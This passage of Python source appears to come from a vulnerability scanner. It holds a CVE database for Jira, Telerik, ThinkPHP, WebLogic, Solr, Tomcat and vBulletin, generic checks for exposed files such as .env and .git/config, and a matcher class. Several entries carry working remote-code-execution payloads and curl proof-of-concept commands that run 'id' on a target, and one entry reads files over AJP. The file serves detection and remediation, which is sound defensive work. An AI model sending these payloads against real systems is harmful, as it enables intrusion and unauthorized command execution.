        detection_patterns=[r"jira", r"Atlassian", r"JIRA"],
        http_paths=["/secure/ContactAdministrators!default.jspa"],
        response_patterns=[r"jira", r"Contact Site Administrators"],
        poc_commands=[
            "curl 'TARGET_URL/secure/ContactAdministrators!default.jspa'",
            "# Check if contact form is accessible",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-11581"],
        remediation="Update Jira to patched version",
        tags=["jira", "atlassian", "ssti", "critical"]
    ),

    # Telerik UI RCE
    CVEEntry(
        cve_id="CVE-2019-18935",
        title="Telerik UI for ASP.NET AJAX RCE",
        description="Insecure deserialization in Telerik UI leading to RCE",
        severity=Severity.CRITICAL,
        category=VulnCategory.DESERIALIZATION,
        cvss_score=9.8,
        affected_products=["Telerik UI for ASP.NET AJAX < R3 2019"],
        detection_patterns=[r"telerik", r"Telerik", r"Telerik\.Web\.UI"],
        http_paths=["/Telerik.Web.UI.DialogHandler.aspx", "/Telerik.Web.UI.SpellCheckHandler.axd"],
        response_patterns=[r"Telerik", r"DialogHandler"],
        poc_commands=[
            "curl 'TARGET_URL/Telerik.Web.UI.DialogHandler.aspx?dp=1'",
            "# Check for Telerik endpoints",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-18935"],
        remediation="Update Telerik UI and configure encryption keys",
        tags=["telerik", "deserialization", "rce", "aspnet"]
    ),

    # ThinkPHP RCE
    CVEEntry(
        cve_id="CVE-2018-20062",
        title="ThinkPHP Remote Code Execution",
        description="RCE via improper parameter filtering in ThinkPHP",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["ThinkPHP < 5.0.23", "ThinkPHP < 5.1.31"],
        detection_patterns=[r"thinkphp", r"ThinkPHP"],
        http_paths=[
            "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
        ],
        response_patterns=[r"uid=", r"gid="],
        poc_commands=[
            "curl 'TARGET_URL/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2018-20062"],
        remediation="Update ThinkPHP to latest version",
        tags=["thinkphp", "php", "rce", "critical"]
    ),

    # WebLogic RCE
    CVEEntry(
        cve_id="CVE-2020-14882",
        title="Oracle WebLogic Server RCE",
        description="Unauthenticated RCE in Oracle WebLogic Server Console",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Oracle WebLogic Server 10.3.6.0.0", "Oracle WebLogic Server 12.1.3.0.0", "Oracle WebLogic Server 12.2.1.3.0", "Oracle WebLogic Server 12.2.1.4.0", "Oracle WebLogic Server 14.1.1.0.0"],
        detection_patterns=[r"weblogic", r"WebLogic", r":7001", r":7002"],
        http_paths=[
            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('id');\")",
        ],
        response_patterns=[r"weblogic", r"WebLogic Server"],
        poc_commands=[
            "curl 'TARGET_URL/console/css/%252e%252e%252fconsole.portal'",
            "# Check if WebLogic console is accessible",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-14882"],
        remediation="Apply Oracle Critical Patch Update",
        tags=["weblogic", "oracle", "rce", "critical"]
    ),

    # Apache Solr RCE
    CVEEntry(
        cve_id="CVE-2019-17558",
        title="Apache Solr Velocity Template RCE",
        description="RCE via Velocity template injection in Apache Solr",
        severity=Severity.CRITICAL,
        category=VulnCategory.SSTI,
        cvss_score=9.8,
        affected_products=["Apache Solr 5.0.0 - 8.3.1"],
        detection_patterns=[r"solr", r"Solr", r":8983"],
        http_paths=["/solr/admin/cores", "/solr/"],
        response_patterns=[r"solr", r"Solr"],
        poc_commands=[
            "curl 'TARGET_URL/solr/admin/cores?wt=json'",
            "# Get core names, then exploit via VelocityResponseWriter",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-17558"],
        remediation="Update Apache Solr and disable VelocityResponseWriter",
        tags=["solr", "apache", "ssti", "rce", "critical"]
    ),

    # Apache Tomcat AJP (Ghostcat)
    CVEEntry(
        cve_id="CVE-2020-1938",
        title="Apache Tomcat AJP Ghostcat File Read/Inclusion",
        description="File read and potential RCE via AJP connector in Tomcat",
        severity=Severity.CRITICAL,
        category=VulnCategory.LFI,
        cvss_score=9.8,
        affected_products=["Apache Tomcat < 6.0.53", "Apache Tomcat < 7.0.100", "Apache Tomcat < 8.5.51", "Apache Tomcat < 9.0.31"],
        detection_patterns=[r"tomcat", r"Tomcat", r":8009"],
        http_paths=[],
        poc_commands=[
            "# Use ajpShooter or similar tool against port 8009",
            "python ajpShooter.py TARGET_HOST 8009 /WEB-INF/web.xml read",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"],
        remediation="Disable AJP connector or restrict to localhost",
        tags=["tomcat", "apache", "ajp", "ghostcat", "lfi"]
    ),

    # vBulletin RCE
    CVEEntry(
        cve_id="CVE-2019-16759",
        title="vBulletin Pre-Auth RCE",
        description="Unauthenticated RCE via widget template in vBulletin",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["vBulletin 5.x < 5.5.4 PL1"],
        detection_patterns=[r"vbulletin", r"vBulletin"],
        http_paths=["/ajax/render/widget_tabbedcontainer_tab_panel"],
        http_methods=["POST"],
        payloads=[
            "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('id');",
        ],
        response_patterns=[r"uid=", r"gid="],
        poc_commands=[
            "curl -X POST 'TARGET_URL/ajax/render/widget_tabbedcontainer_tab_panel' -d \"subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('id');\"",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-16759"],
        remediation="Update vBulletin to latest patched version",
        tags=["vbulletin", "php", "rce", "critical"]
    ),
]

# Additional vulnerability patterns (non-CVE specific)
GENERIC_VULN_PATTERNS = {
    "server_version_disclosure": {
        "patterns": [
            r"Server:\s*(Apache|nginx|IIS|Tomcat|lighttpd)[/\s]*[\d.]+",
            r"X-Powered-By:\s*(PHP|ASP\.NET|Express|Django)[/\s]*[\d.]+",
            r"X-AspNet-Version:\s*[\d.]+",
        ],
        "severity": Severity.LOW,
        "category": VulnCategory.INFO_DISCLOSURE,
        "description": "Server version information disclosed in headers",
        "remediation": "Configure web server to hide version information",
    },
    "directory_listing": {
        "patterns": [
            r"Index of /",
            r"<title>Index of",
            r"Directory listing for",
            r"\[To Parent Directory\]",
        ],
        "severity": Severity.MEDIUM,
        "category": VulnCategory.INFO_DISCLOSURE,
        "description": "Directory listing enabled",
        "remediation": "Disable directory listing in web server configuration",
    },
    "backup_files": {
        "paths": [
            "/.git/config",
            "/.svn/entries",
            "/.env",
            "/config.php.bak",
            "/wp-config.php.bak",
            "/web.config.bak",
            "/.htaccess.bak",
            "/database.sql",
            "/backup.sql",
            "/dump.sql",
        ],
        "severity": Severity.HIGH,
        "category": VulnCategory.INFO_DISCLOSURE,
        "description": "Backup or sensitive files exposed",
        "remediation": "Remove backup files from web-accessible directories",
    },
    "sensitive_files": {
        "paths": [
            "/phpinfo.php",
            "/info.php",
            "/.DS_Store",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml",
            "/server-status",
            "/server-info",
            "/.well-known/security.txt",
            "/robots.txt",
            "/sitemap.xml",
        ],
        "severity": Severity.LOW,
        "category": VulnCategory.INFO_DISCLOSURE,
        "description": "Potentially sensitive files accessible",
    },
    "default_credentials": {
        "paths": [
            "/admin/",
            "/administrator/",
            "/phpmyadmin/",
            "/manager/html",
            "/manager/status",
        ],
        "severity": Severity.HIGH,
        "category": VulnCategory.AUTH_BYPASS,
        "description": "Default admin panels accessible",
        "remediation": "Change default credentials and restrict access",
    },
}


class CVEMatcher:
    """Matches targets against CVE database"""

    def __init__(self):
        self.cve_db = CVE_DATABASE
        self.generic_patterns = GENERIC_VULN_PATTERNS

    def find_by_cve_id(self, cve_id: str) -> Optional[CVEEntry]:
        """Find CVE by ID"""
        for cve in self.cve_db:
            if cve.cve_id.upper() == cve_id.upper():
                return cve
        return None

    def find_by_product(self, product: str) -> List[CVEEntry]:
        """Find CVEs affecting a product"""
        results = []
        product_lower = product.lower()
        for cve in self.cve_db:
            for affected in cve.affected_products:
                if product_lower in affected.lower():
                    results.append(cve)
                    break
        return results

    def find_by_severity(self, severity: Severity) -> List[CVEEntry]:
        """Find CVEs by severity level"""
        return [cve for cve in self.cve_db if cve.severity == severity]

    def find_by_category(self, category: VulnCategory) -> List[CVEEntry]:
        """Find CVEs by vulnerability category"""
        return [cve for cve in self.cve_db if cve.category == category]

    def find_by_tag(self, tag: str) -> List[CVEEntry]:
        """Find CVEs by tag"""
        tag_lower = tag.lower()
        return [cve for cve in self.cve_db if tag_lower in [t.lower() for t in cve.tags]]

    def match_banner(self, banner: str) -> List[CVEEntry]:
        """Match server banner against CVE detection patterns"""
        results = []
        for cve in self.cve_db:
            for pattern in cve.detection_patterns:
                if re.search(pattern, banner, re.IGNORECASE):
                    results.append(cve)
                    break
        return results

    def get_all_cves(self) -> List[CVEEntry]:
        """Get all CVEs in database"""
        return self.cve_db

    def get_critical_cves(self) -> List[CVEEntry]:
        """Get all critical CVEs"""
        return self.find_by_severity(Severity.CRITICAL)

    def get_exploitable_cves(self) -> List[CVEEntry]:
        """Get CVEs with available exploits"""
        return [cve for cve in self.cve_db if cve.exploit_available]


# Utility functions
def get_cve_count() -> int:
    """Get total number of CVEs in database"""
    return len(CVE_DATABASE)


def get_severity_stats() -> Dict[str, int]:
    """Get CVE count by severity"""
    stats = {}
    for severity in Severity:
        stats[severity.value] = len([c for c in CVE_DATABASE if c.severity == severity])
    return stats


def get_category_stats() -> Dict[str, int]:
    """Get CVE count by category"""
    stats = {}
    for category in VulnCategory:
        count = len([c for c in CVE_DATABASE if c.category == category])
        if count > 0:
            stats[category.value] = count
    return stats


if __name__ == "__main__":
    # Test the module
    print(f"CVE Database loaded with {get_cve_count()} entries")
    print(f"\nSeverity distribution: {get_severity_stats()}")
    print(f"\nCategory distribution: {get_category_stats()}")

    matcher = CVEMatcher()
    critical = matcher.get_critical_cves()
    print(f"\nCritical CVEs: {len(critical)}")
    for cve in critical[:5]:
        print(f"  - {cve.cve_id}: {cve.title}")
